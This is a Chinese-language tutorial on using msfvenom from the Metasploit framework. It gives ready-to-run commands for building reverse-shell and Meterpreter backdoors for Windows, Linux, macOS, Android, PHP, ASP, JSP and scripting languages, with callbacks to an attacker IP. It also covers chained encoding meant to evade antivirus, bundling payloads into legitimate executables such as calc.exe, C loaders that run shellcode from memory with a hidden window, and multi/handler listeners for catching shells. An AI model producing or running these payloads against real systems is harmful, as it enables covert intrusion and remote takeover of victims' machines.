>参考 [metasploit-framework wiki](https://github.com/rapid7/metasploit-framework/wiki) 中的 [How-to-use-msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom)



### 简介
**msfvenom**是Metasploit框架中独立的payload生成器。
（2015.6.8取代了之前的 `msfpayload` 和 `msfencode`）

### 帮助信息

```
msfvenom --help
MsfVenom - a Metasploit standalone payload generator.
Also a replacement for msfpayload and msfencode.
Usage: /usr/bin/msfvenom [options] <var=val>
Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe

Options:
    -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
    -p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
        --list-options               List --payload <value>'s standard, advanced and evasion options
    -f, --format          <format>   Output format (use --list formats to list)
    -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)
        --sec-name        <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string
        --smallest                   Generate the smallest possible payload using all available encoders
        --encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)
        --encrypt-key     <value>    A key to be used for --encrypt
        --encrypt-iv      <value>    An initialization vector for --encrypt
    -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)
        --platform        <platform> The platform for --payload (use --list platforms to list)
    -o, --out             <path>     Save the payload to a file
    -b, --bad-chars       <list>     Characters to avoid example: '\x00\xff'
    -n, --nopsled         <length>   Prepend a nopsled of [length] size on to the payload
        --pad-nops                   Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)
    -s, --space           <length>   The maximum size of the resulting payload
        --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)
    -i, --iterations      <count>    The number of times to encode the payload
    -c, --add-code        <path>     Specify an additional win32 shellcode file to include
    -x, --template        <path>     Specify a custom executable file to use as a template
    -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread
    -v, --var-name        <value>    Specify a custom variable name to use for certain output formats
    -t, --timeout         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
    -h, --help                       Show this message
```


### 生成payload - 基本说明

* 类型1 生成不经过编码的普通payload（不编码->生成内容固定->直接被杀）

```
#格式
msfvenom --payload <payload> <payload options> -f <format> -o <path>
#实例
msfvenom --payload windows/meterpreter/reverse_tcp -f c -o 1.c
```

* 类型2 经过编码器处理后生成payload

```
#格式
msfvenom --payload <payload> -e <encoder > -i <encoder times> -n <nopsled> -f <format> -o <path>
#实例
msfvenom --payload windows/meterpreter/reverse_tcp -i 3 -e x86/shikata_ga_nai -f exe -o C:\back.exe
```

* 类型3 捆绑到正常文件后生成payload（暂未测试是否可加-e参数）

```
Msfvenom --payload windows/meterpreter/reverse_tcp -platform windows -a x86 -x C:\calc.exe -k -f exe -o C:\shell.exe
```


### --payload [指定攻击载荷名称]

生成payload至少需指定--payload 和 -f

* --payload
  * 可指定msfvenom自带的payload名称 如 `--payload windows/meterpreter/reverse_tcp`
  * 可指定自定义的payload 如`cat custom_payload_shellcode.bin | msfvenom --payload - -a x86 --platform win -e x86/shikata_ga_nai -f raw -o shellcode_encoded.bin`

所有攻击载荷的名称 参考本文末尾的 msfvenom payloads
 

### -f [指定payload的输出文件格式]

* -f 支持输出各种文件格式
  * 可执行格式(便于直接执行)
    * `-f exe` 生成windows可执行程序
    * `-f exe-only`
    * `-f msi`
    * `-f vba` 生成Visual Basic for Applications可执行程序（一种可用于扩展Office 应用程序的简单且强大的编程语言）参考[Office VBA 入门 | Microsoft Docs](https://docs.microsoft.com/zh-cn/office/vba/library-reference/concepts/getting-started-with-vba-in-office)
    * `-f elf` 生成linux可执行程序
    * `-f elf-so`
    * `-f macho` 生成macOS/iOS可执行程序
    * `-f osx-app`
    * `-f jar`
    * ...
  * 可转换格式(便于自定义使用)
    * `-f raw` 生成原生格式 不指定-f时的默认输出格式
    * `-f hex` 生成十六进制hex编码形式 如`\x0a`
    * `-f python`
    * `-f c`
    * `-f csharp` 生成C#代码
    * `-f powershell`
    * `-f bash`
    * `-f sh`
    * ...



全部输出格式
```
msfvenom --list format

Framework Executable Formats [--format <value>]
===============================================

    Name
    ----
    asp
    aspx
    aspx-exe
    axis2
    dll
    elf
    elf-so
    exe
    exe-only
    exe-service
    exe-small
    hta-psh
    jar
    jsp
    loop-vbs
    macho
    msi
    msi-nouac
    osx-app
    psh
    psh-cmd
    psh-net
    psh-reflection
    vba
    vba-exe
    vba-psh
    vbs
    war

Framework Transform Formats [--format <value>]
==============================================

    Name
    ----
    bash
    c
    csharp
    dw
    dword
    hex
    java
    js_be
    js_le
    num
    perl
    pl
    powershell
    ps1
    py
    python
    raw
    rb
    ruby
    sh
    vbapplication
    vbscript
```


### -a [指定架构architecture]

* -a
  * `-a x86`
  * `-a x86_64`



全部archs
```
msfvenom --list archs

Framework Architectures [--arch <value>]
========================================

    Name
    ----
    aarch64
    armbe
    armle
    cbea
    cbea64
    cmd
    dalvik
    firefox
    java
    mips
    mips64
    mips64le
    mipsbe
    mipsle
    nodejs
    php
    ppc
    ppc64
    ppc64le
    ppce500v2
    python
    r
    ruby
    sparc
    sparc64
    tty
    x64
    x86
    x86_64
    zarch


```

### --platform 指定支持的系统

```
msfvenom --list platforms

Framework Platforms [--platform <value>]
========================================

    Name
    ----
    aix
    android
    apple_ios
    bsd
    bsdi
    cisco
    firefox
    freebsd
    hardware
    hpux
    irix
    java
    javascript
    juniper
    linux
    mainframe
    multi
    netbsd
    netware
    nodejs
    openbsd
    osx
    php
    python
    r
    ruby
    solaris
    unifi
    unix
    unknown
    windows
```


	
可以不使用-a参数来指定架构，直接在--payload中的payload名称中明确指定架构，如：

```
msfvenom --payload linux/x86/exec CMD=/bin/sh
```

看到该payload指定了参数CMD的值

查看某个Payload具体需要哪些参数
```
msfvenom --payload linux/x86/exec --payload-options

# 必需参数的Required为yes
```

### -b 编码器名称

使用编码器 对payload进行编码

1.使用-b参数 指定需要规避的特殊字符列表

msf会"自动"找一个合适的编码器规避payload中的这些"坏字符"
```
msfvenom --payload windows/meterpreter/bind_tcp -b '\x00' -f raw

Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
```

* 不同的函数，规避的字符不同
  * gets函数 需要避免`/x0a`
  * scanf函数 更严格，不允许空白符
  * ...

2.使用-e参数 指定编码器名称encoderName

如
```
msfvenom --payload windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw -o test.bin
```

默认的输出格式是raw(直接输出payload的字符 含乱码)


3.使用-i参数 指定迭代编码的次数

如 3次迭代编码(迭代编码也许会有规避杀毒软件的作用)
```
msfvenom --payload windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3
```

4.综合使用 - 通过管道符号 依次使用"多个编码器" 对输出进行编码

```
msfvenom --payload windows/meterpreter/reverse_tcp LHOST=192.168.0.3 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | \
msfvenom -a x86 --platform windows -e x86/countdown -i 8 -f raw | \
msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe
```


所有的编码器
```
msfvenom -l encoders

Framework Encoders [--encoder <value>]
======================================

    Name                          Rank       Description
    ----                          ----       -----------
    cmd/brace                     low        Bash Brace Expansion Command Encoder
    cmd/echo                      good       Echo Command Encoder
    cmd/generic_sh                manual     Generic Shell Variable Substitution Command Encoder
    cmd/ifs                       low        Bourne ${IFS} Substitution Command Encoder
    cmd/perl                      normal     Perl Command Encoder
    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
    cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder
    generic/eicar                 manual     The EICAR Encoder
    generic/none                  normal     The "none" Encoder
    mipsbe/byte_xori              normal     Byte XORi Encoder
    mipsbe/longxor                normal     XOR Encoder
    mipsle/byte_xori              normal     Byte XORi Encoder
    mipsle/longxor                normal     XOR Encoder
    php/base64                    great      PHP Base64 Encoder
    ppc/longxor                   normal     PPC LongXOR Encoder
    ppc/longxor_tag               normal     PPC LongXOR Encoder
    ruby/base64                   great      Ruby Base64 Encoder
    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder
    x64/xor                       normal     XOR Encoder
    x64/xor_dynamic               normal     Dynamic key XOR Encoder
    x64/zutto_dekiru              manual     Zutto Dekiru
    x86/add_sub                   manual     Add/Sub Encoder
    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower
    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower
    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder
    x86/bmp_polyglot              manual     BMP Polyglot
    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder
    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder
    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder
    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder
    x86/countdown                 normal     Single-byte XOR Countdown Encoder
    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder
    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder
    x86/nonalpha                  low        Non-Alpha Encoder
    x86/nonupper                  low        Non-Upper Encoder
    x86/opt_sub                   manual     Sub Encoder (optimised)
    x86/service                   manual     Register Service
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
    x86/single_static_bit         manual     Single Static Bit
    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
    x86/xor_dynamic               normal     Dynamic key XOR Encoder
```


### -x 指定一个模板文件（将payload附加"捆绑"到某个正常的模版文件）

捆绑payload到 模板文件（即 宿主文件， 即 自定义的可执行文件）

如 使用windows下的calc.exe作为模板文件,生成payload：
```
msfvenom --payload windows/meterpreter/bind_tcp -x calc.exe -f exe > new.exe
```

msfvenom使用的模板文件保存在目录`msf/data/templates`



注意，在win x64下使用自定义的x64的模板文件（如exe等）创建x64的payload时，输出格式必须要写`-f exe-only`而不能写`-f exe`
（Please note: If you'd like to create a x64 payload with a custom x64 custom template for Windows, then instead of the exe format, you should use exe-only:）

```
msfvenom --payload windows/x64/meterpreter/bind_tcp -x /tmp/templates/64_calc.exe -f exe-only > /tmp/fake_64_calc.exe
```

-x选项经常和-k选项一起用，它允许您从模板中将payload作为新的线程运行。但是它目前只支持较老的系统，如x86 Windows XP.
（The -x flag is often paired with the -k flag, which allows you to run your payload as a new thread from the template. However, this currently is only reliable for older Windows machines such as x86 Windows XP.）


### 编译生成的C文件

```bash
#win x86 生成c文件
msfvenom --payload windows/meterpreter/reverse_tcp lhost=[AttackerIP] lport=4444 -f c -e x86/shikata_ga_nai -i 12 -b '\x00'


#vc++6.0 编译（含buf数组的）C代码：
#include <stdio.h>
#pragmacomment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")//运行时不显示窗口
unsignedchar buf[] =
"buf数组";//复制数组内容 粘贴到此处
main()
{
((void(*)(void))&buf)();
}


#VS 编译：
main()

{

	Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(Memory, buf, sizeof(buf));

	((void(*)())Memory)();

}
```


### 生成各系统下的TCP反向连接后门

reverse_tcp 支持以下平台

Platform: Android, BSD, Java, JavaScript, Linux, OSX, NodeJS, PHP, Python, Ruby, Solaris, Unix, Windows, Mainframe, Multi


操作系统
```
#win x86
msfvenom --payload windows/meterpreter/reverse_tcp lhost=[AttackerIP] lport=4444 -f exe -o /tmp/my_payload.exe
x86下 -p后加: windows/../..
没有这种名字的载荷: windows/x86/../.. 


#linux x86
msfvenom --payload linux/x86/meterpreter/reverse_tcp LHOST=[AttackerIP] LPORT=[AttackerPort] -f elf > shell.elf

#Mac x64
msfvenom --payload osx/x64/shell_reverse_tcp LHOST=[AttackerIP] LPORT=[AttackerPort] -f macho > shell.macho


#android
msfvenom --payload android/meterpreter/reverse_tcp LHOST=[AttackerIP] LPORT=[AttackerPort] R > androvirus.apk
```


Web语言
```
#PHP
msfvenom --payload php/meterpreter_reverse_tcp LHOST=[AttackerIP] LPORT=[AttackerPort] -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

#.ASP
msfvenom --payload windows/meterpreter/reverse_tcp LHOST=[AttackerIP] LPORT=[AttackerPort] -f asp > shell.asp

#.JSP
msfvenom --payload java/jsp_shell_reverse_tcp LHOST=[AttackerIP] LPORT=[AttackerPort] -f raw > shell.jsp

#.WAR
msfvenom --payload java/jsp_shell_reverse_tcp LHOST=[AttackerIP] LPORT=[AttackerPort] -f war > shell.war
```


脚本语言
```
#Python
msfvenom --payload cmd/unix/reverse_python LHOST=[AttackerIP] LPORT=[AttackerPort]  -f raw > shell.py
#Bash
msfvenom --payload cmd/unix/reverse_bash LHOST=[AttackerIP]  LPORT=[AttackerPort]  -f raw > shell.sh
#Perl
msfvenom --payload cmd/unix/reverse_perl LHOST=[AttackerIP] LPORT=[AttackerPort] -f raw > shell.pl
```


### msf开启监听

攻击机启动**Handlers**以开启`AttackerLocalIP:Port`监听，等待反弹shell。一旦接收到反弹shell，则创建一个session。

Metasploit to be in a position to receive your incoming shells. 


启动multihandler进行端口监听-单条命令
```
# 只打算接受一个shell
msfconsole -x "use exploits/multi/handler; set lhost [AttackerLocalIP]; set lport [AttackerLocalPort]; set payload windows/meterpreter/reverse_tcp; exploit"

# 可接受多个反弹shell(LPORT端口会一直监听)
msfconsole -x "use exploits/multi/handler; set lhost [AttackerLocalIP]; set lport [AttackerLocalPort]; set payload windows/meterpreter/reverse_tcp; set ExitOnSession false; exploit -j -z"
```

启动multihandler进行端口监听-多条命令
```
use exploit/multi/handler 
show options
set payload windows/x64/meterpreter/reverse_tcp
set LHOST [AttackerLocalIP]
#默认4444端口
set LPORT [AttackerLocalPort]
# 运行以下两条命令 - 可接受多个反弹shell(LPORT端口会一直监听)
set ExitOnSession false
exploit -j -z
```


### msfvenom payloads

```
msfvenom -l payloads

Framework Payloads (547 total) [--payload <value>]
==================================================

    Name                                                Description
    ----                                                -----------
    aix/ppc/shell_bind_tcp                              Listen for a connection and spawn a command shell
    aix/ppc/shell_find_port                             Spawn a shell on an established connection
    aix/ppc/shell_interact                              Simply execve /bin/sh (for inetd programs)
    aix/ppc/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
    android/meterpreter/reverse_http                    Run a meterpreter server in Android. Tunnel communication over HTTP
    android/meterpreter/reverse_https                   Run a meterpreter server in Android. Tunnel communication over HTTPS
    android/meterpreter/reverse_tcp                     Run a meterpreter server in Android. Connect back stager
    android/meterpreter_reverse_http                    Connect back to attacker and spawn a Meterpreter shell
    android/meterpreter_reverse_https                   Connect back to attacker and spawn a Meterpreter shell
    android/meterpreter_reverse_tcp                     Connect back to the attacker and spawn a Meterpreter shell
    android/shell/reverse_http                          Spawn a piped command shell (sh). Tunnel communication over HTTP
    android/shell/reverse_https                         Spawn a piped command shell (sh). Tunnel communication over HTTPS
    android/shell/reverse_tcp                           Spawn a piped command shell (sh). Connect back stager
    apple_ios/aarch64/meterpreter_reverse_http          Run the Meterpreter / Mettle server payload (stageless)
    apple_ios/aarch64/meterpreter_reverse_https         Run the Meterpreter / Mettle server payload (stageless)
    apple_ios/aarch64/meterpreter_reverse_tcp           Run the Meterpreter / Mettle server payload (stageless)
    apple_ios/aarch64/shell_reverse_tcp                 Connect back to attacker and spawn a command shell
    apple_ios/armle/meterpreter_reverse_http            Run the Meterpreter / Mettle server payload (stageless)
    apple_ios/armle/meterpreter_reverse_https           Run the Meterpreter / Mettle server payload (stageless)
    apple_ios/armle/meterpreter_reverse_tcp             Run the Meterpreter / Mettle server payload (stageless)
    bsd/sparc/shell_bind_tcp                            Listen for a connection and spawn a command shell
    bsd/sparc/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
    bsd/vax/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
    bsd/x64/exec                                        Execute an arbitrary command
    bsd/x64/shell_bind_ipv6_tcp                         Listen for a connection and spawn a command shell over IPv6
    bsd/x64/shell_bind_tcp                              Bind an arbitrary command to an arbitrary port
    bsd/x64/shell_bind_tcp_small                        Listen for a connection and spawn a command shell
    bsd/x64/shell_reverse_ipv6_tcp                      Connect back to attacker and spawn a command shell over IPv6
    bsd/x64/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
    bsd/x64/shell_reverse_tcp_small                     Connect back to attacker and spawn a command shell
    bsd/x86/exec                                        Execute an arbitrary command
    bsd/x86/metsvc_bind_tcp                             Stub payload for interacting with a Meterpreter Service
    bsd/x86/metsvc_reverse_tcp                          Stub payload for interacting with a Meterpreter Service
    bsd/x86/shell/bind_ipv6_tcp                         Spawn a command shell (staged). Listen for a connection over IPv6
    bsd/x86/shell/bind_tcp                              Spawn a command shell (staged). Listen for a connection
    bsd/x86/shell/find_tag                              Spawn a command shell (staged). Use an established connection
    bsd/x86/shell/reverse_ipv6_tcp                      Spawn a command shell (staged). Connect back to the attacker over IPv6
    bsd/x86/shell/reverse_tcp                           Spawn a command shell (staged). Connect back to the attacker
    bsd/x86/shell_bind_tcp                              Listen for a connection and spawn a command shell
    bsd/x86/shell_bind_tcp_ipv6                         Listen for a connection and spawn a command shell over IPv6
    bsd/x86/shell_find_port                             Spawn a shell on an established connection
    bsd/x86/shell_find_tag                              Spawn a shell on an established connection (proxy/nat safe)
    bsd/x86/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
    bsd/x86/shell_reverse_tcp_ipv6                      Connect back to attacker and spawn a command shell over IPv6
    bsdi/x86/shell/bind_tcp                             Spawn a command shell (staged). Listen for a connection
    bsdi/x86/shell/reverse_tcp                          Spawn a command shell (staged). Connect back to the attacker
    bsdi/x86/shell_bind_tcp                             Listen for a connection and spawn a command shell
    bsdi/x86/shell_find_port                            Spawn a shell on an established connection
    bsdi/x86/shell_reverse_tcp                          Connect back to attacker and spawn a command shell
    cmd/mainframe/apf_privesc_jcl                       (Elevate privileges for user. Adds SYSTEM SPECIAL and BPX.SUPERUSER to user profile. Does this by using an unsecured/updateable APF authorized library (APFLIB) and updating the user's ACEE using this program/library. Note: This privesc only works with z/OS systems using RACF, no other ESM is supported.)
    cmd/mainframe/bind_shell_jcl                        Provide JCL which creates a bind shell This implmentation does not include ebcdic character translation, so a client with translation capabilities is required. MSF handles this automatically.
    cmd/mainframe/generic_jcl                           Provide JCL which can be used to submit a job to JES2 on z/OS which will exit and return 0. This can be used as a template for other JCL based payloads
    cmd/mainframe/reverse_shell_jcl                     Provide JCL which creates a reverse shell This implementation does not include ebcdic character translation, so a client with translation capabilities is required. MSF handles this automatically.
    cmd/unix/bind_awk                                   Listen for a connection and spawn a command shell via GNU AWK
    cmd/unix/bind_busybox_telnetd                       Listen for a connection and spawn a command shell via BusyBox telnetd
    cmd/unix/bind_inetd                                 Listen for a connection and spawn a command shell (persistent)
    cmd/unix/bind_lua                                   Listen for a connection and spawn a command shell via Lua
    cmd/unix/bind_netcat                                Listen for a connection and spawn a command shell via netcat
    cmd/unix/bind_netcat_gaping                         Listen for a connection and spawn a command shell via netcat
    cmd/unix/bind_netcat_gaping_ipv6                    Listen for a connection and spawn a command shell via netcat
    cmd/unix/bind_nodejs                                Continually listen for a connection and spawn a command shell via nodejs
    cmd/unix/bind_perl                                  Listen for a connection and spawn a command shell via perl
    cmd/unix/bind_perl_ipv6                             Listen for a connection and spawn a command shell via perl
    cmd/unix/bind_r                                     Continually listen for a connection and spawn a command shell via R
    cmd/unix/bind_ruby                                  Continually listen for a connection and spawn a command shell via Ruby
    cmd/unix/bind_ruby_ipv6                             Continually listen for a connection and spawn a command shell via Ruby
    cmd/unix/bind_socat_udp                             Creates an interactive shell via socat
    cmd/unix/bind_stub                                  Listen for a connection and spawn a command shell (stub only, no payload)
    cmd/unix/bind_zsh                                   Listen for a connection and spawn a command shell via Zsh. Note: Although Zsh is often available, please be aware it isn't usually installed by default.
    cmd/unix/generic                                    Executes the supplied command
    cmd/unix/interact                                   Interacts with a shell on an established socket connection
    cmd/unix/reverse                                    Creates an interactive shell through two inbound connections
    cmd/unix/reverse_awk                                Creates an interactive shell via GNU AWK
    cmd/unix/reverse_bash                               Creates an interactive shell via bash's builtin /dev/tcp. This will not work on circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bash without the /dev/tcp feature.
    cmd/unix/reverse_bash_telnet_ssl                    Creates an interactive shell via mkfifo and telnet. This method works on Debian and other systems compiled without /dev/tcp support. This module uses the '-z' option included on some systems to encrypt using SSL.
    cmd/unix/reverse_bash_udp                           Creates an interactive shell via bash's builtin /dev/udp. This will not work on circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bash without the /dev/udp feature.
    cmd/unix/reverse_ksh                                Connect back and create a command shell via Ksh. Note: Although Ksh is often available, please be aware it isn't usually installed by default.
    cmd/unix/reverse_lua                                Creates an interactive shell via Lua
    cmd/unix/reverse_ncat_ssl                           Creates an interactive shell via ncat, utilizing ssl mode
    cmd/unix/reverse_netcat                             Creates an interactive shell via netcat
    cmd/unix/reverse_netcat_gaping                      Creates an interactive shell via netcat
    cmd/unix/reverse_nodejs                             Continually listen for a connection and spawn a command shell via nodejs
    cmd/unix/reverse_openssl                            Creates an interactive shell through two inbound connections
    cmd/unix/reverse_perl                               Creates an interactive shell via perl
    cmd/unix/reverse_perl_ssl                           Creates an interactive shell via perl, uses SSL
    cmd/unix/reverse_php_ssl                            Creates an interactive shell via php, uses SSL
    cmd/unix/reverse_python                             Connect back and create a command shell via Python
    cmd/unix/reverse_python_ssl                         Creates an interactive shell via python, uses SSL, encodes with base64 by design.
    cmd/unix/reverse_r                                  Connect back and create a command shell via R
    cmd/unix/reverse_ruby                               Connect back and create a command shell via Ruby
    cmd/unix/reverse_ruby_ssl                           Connect back and create a command shell via Ruby, uses SSL
    cmd/unix/reverse_socat_udp                          Creates an interactive shell via socat
    cmd/unix/reverse_ssl_double_telnet                  Creates an interactive shell through two inbound connections, encrypts using SSL via "-z" option
    cmd/unix/reverse_stub                               Creates an interactive shell through an inbound connection (stub only, no payload)
    cmd/unix/reverse_zsh                                Connect back and create a command shell via Zsh. Note: Although Zsh is often available, please be aware it isn't usually installed by default.
    cmd/windows/adduser                                 Create a new user and add them to local administration group. Note: The specified password is checked for common complexity requirements to prevent the target machine rejecting the user for failing to meet policy requirements. Complexity check: 8-14 chars (1 UPPER, 1 lower, 1 digit/special)
    cmd/windows/bind_lua                                Listen for a connection and spawn a command shell via Lua
    cmd/windows/bind_perl                               Listen for a connection and spawn a command shell via perl (persistent)
    cmd/windows/bind_perl_ipv6                          Listen for a connection and spawn a command shell via perl (persistent)
    cmd/windows/bind_ruby                               Continually listen for a connection and spawn a command shell via Ruby
    cmd/windows/download_eval_vbs                       Downloads a file from an HTTP(S) URL and executes it as a vbs script. Use it to stage a vbs encoded payload from a short command line.
    cmd/windows/download_exec_vbs                       Download an EXE from an HTTP(S) URL and execute it
    cmd/windows/generic                                 Executes the supplied command
    cmd/windows/powershell_bind_tcp                     Interacts with a powershell session on an established socket connection
    cmd/windows/powershell_reverse_tcp                  Interacts with a powershell session on an established socket connection
    cmd/windows/reverse_lua                             Creates an interactive shell via Lua
    cmd/windows/reverse_perl                            Creates an interactive shell via perl
    cmd/windows/reverse_powershell                      Connect back and create a command shell via Powershell
    cmd/windows/reverse_ruby                            Connect back and create a command shell via Ruby
    firefox/exec                                        This module runs a shell command on the target OS without touching the disk. On Windows, this command will flash the command prompt momentarily. This can be avoided by setting WSCRIPT to true, which drops a jscript "launcher" to disk that hides the prompt.
    firefox/shell_bind_tcp                              Creates an interactive shell via Javascript with access to Firefox's XPCOM API
    firefox/shell_reverse_tcp                           Creates an interactive shell via Javascript with access to Firefox's XPCOM API
    generic/custom                                      Use custom string or file as payload. Set either PAYLOADFILE or PAYLOADSTR.
    generic/debug_trap                                  Generate a debug trap in the target process
    generic/shell_bind_tcp                              Listen for a connection and spawn a command shell
    generic/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
    generic/tight_loop                                  Generate a tight loop in the target process
    java/jsp_shell_bind_tcp                             Listen for a connection and spawn a command shell
    java/jsp_shell_reverse_tcp                          Connect back to attacker and spawn a command shell
    java/meterpreter/bind_tcp                           Run a meterpreter server in Java. Listen for a connection
    java/meterpreter/reverse_http                       Run a meterpreter server in Java. Tunnel communication over HTTP
    java/meterpreter/reverse_https                      Run a meterpreter server in Java. Tunnel communication over HTTPS
    java/meterpreter/reverse_tcp                        Run a meterpreter server in Java. Connect back stager
    java/shell/bind_tcp                                 Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Listen for a connection
    java/shell/reverse_tcp                              Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Connect back stager
    java/shell_reverse_tcp                              Connect back to attacker and spawn a command shell
    linux/aarch64/meterpreter/reverse_tcp               Inject the mettle server payload (staged). Connect back to the attacker
    linux/aarch64/meterpreter_reverse_http              Run the Meterpreter / Mettle server payload (stageless)
    linux/aarch64/meterpreter_reverse_https             Run the Meterpreter / Mettle server payload (stageless)
    linux/aarch64/meterpreter_reverse_tcp               Run the Meterpreter / Mettle server payload (stageless)
    linux/aarch64/shell/reverse_tcp                     dup2 socket in x12, then execve. Connect back to the attacker
    linux/aarch64/shell_reverse_tcp                     Connect back to attacker and spawn a command shell
    linux/armbe/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless)
    linux/armbe/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless)
    linux/armbe/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)
    linux/armbe/shell_bind_tcp                          Listen for a connection and spawn a command shell
    linux/armle/adduser                                 Create a new user with UID 0
    linux/armle/exec                                    Execute an arbitrary command
    linux/armle/meterpreter/bind_tcp                    Inject the mettle server payload (staged). Listen for a connection
    linux/armle/meterpreter/reverse_tcp                 Inject the mettle server payload (staged). Connect back to the attacker
    linux/armle/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless)
    linux/armle/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless)
    linux/armle/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)
    linux/armle/shell/bind_tcp                          dup2 socket in r12, then execve. Listen for a connection
    linux/armle/shell/reverse_tcp                       dup2 socket in r12, then execve. Connect back to the attacker
    linux/armle/shell_bind_tcp                          Connect to target and spawn a command shell
    linux/armle/shell_reverse_tcp                       Connect back to attacker and spawn a command shell
    linux/mips64/meterpreter_reverse_http               Run the Meterpreter / Mettle server payload (stageless)
    linux/mips64/meterpreter_reverse_https              Run the Meterpreter / Mettle server payload (stageless)
    linux/mips64/meterpreter_reverse_tcp                Run the Meterpreter / Mettle server payload (stageless)
    linux/mipsbe/exec                                   A very small shellcode for executing commands. This module is sometimes helpful for testing purposes.
    linux/mipsbe/meterpreter/reverse_tcp                Inject the mettle server payload (staged). Connect back to the attacker
    linux/mipsbe/meterpreter_reverse_http               Run the Meterpreter / Mettle server payload (stageless)
    linux/mipsbe/meterpreter_reverse_https              Run the Meterpreter / Mettle server payload (stageless)
    linux/mipsbe/meterpreter_reverse_tcp                Run the Meterpreter / Mettle server payload (stageless)
    linux/mipsbe/reboot                                 A very small shellcode for rebooting the system. This payload is sometimes helpful for testing purposes or executing other payloads that rely on initial startup procedures.
    linux/mipsbe/shell/reverse_tcp                      Spawn a command shell (staged). Connect back to the attacker
    linux/mipsbe/shell_bind_tcp                         Listen for a connection and spawn a command shell
    linux/mipsbe/shell_reverse_tcp                      Connect back to attacker and spawn a command shell
    linux/mipsle/exec                                   A very small shellcode for executing commands. This module is sometimes helpful for testing purposes as well as on targets with extremely limited buffer space.
    linux/mipsle/meterpreter/reverse_tcp                Inject the mettle server payload (staged). Connect back to the attacker
    linux/mipsle/meterpreter_reverse_http               Run the Meterpreter / Mettle server payload (stageless)
    linux/mipsle/meterpreter_reverse_https              Run the Meterpreter / Mettle server payload (stageless)
    linux/mipsle/meterpreter_reverse_tcp                Run the Meterpreter / Mettle server payload (stageless)
    linux/mipsle/reboot                                 A very small shellcode for rebooting the system. This payload is sometimes helpful for testing purposes.
    linux/mipsle/shell/reverse_tcp                      Spawn a command shell (staged). Connect back to the attacker
    linux/mipsle/shell_bind_tcp                         Listen for a connection and spawn a command shell
    linux/mipsle/shell_reverse_tcp                      Connect back to attacker and spawn a command shell
    linux/ppc/meterpreter_reverse_http                  Run the Meterpreter / Mettle server payload (stageless)
    linux/ppc/meterpreter_reverse_https                 Run the Meterpreter / Mettle server payload (stageless)
    linux/ppc/meterpreter_reverse_tcp                   Run the Meterpreter / Mettle server payload (stageless)
    linux/ppc/shell_bind_tcp                            Listen for a connection and spawn a command shell
    linux/ppc/shell_find_port                           Spawn a shell on an established connection
    linux/ppc/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
    linux/ppc64/shell_bind_tcp                          Listen for a connection and spawn a command shell
    linux/ppc64/shell_find_port                         Spawn a shell on an established connection
    linux/ppc64/shell_reverse_tcp                       Connect back to attacker and spawn a command shell
    linux/ppc64le/meterpreter_reverse_http              Run the Meterpreter / Mettle server payload (stageless)
    linux/ppc64le/meterpreter_reverse_https             Run the Meterpreter / Mettle server payload (stageless)
    linux/ppc64le/meterpreter_reverse_tcp               Run the Meterpreter / Mettle server payload (stageless)
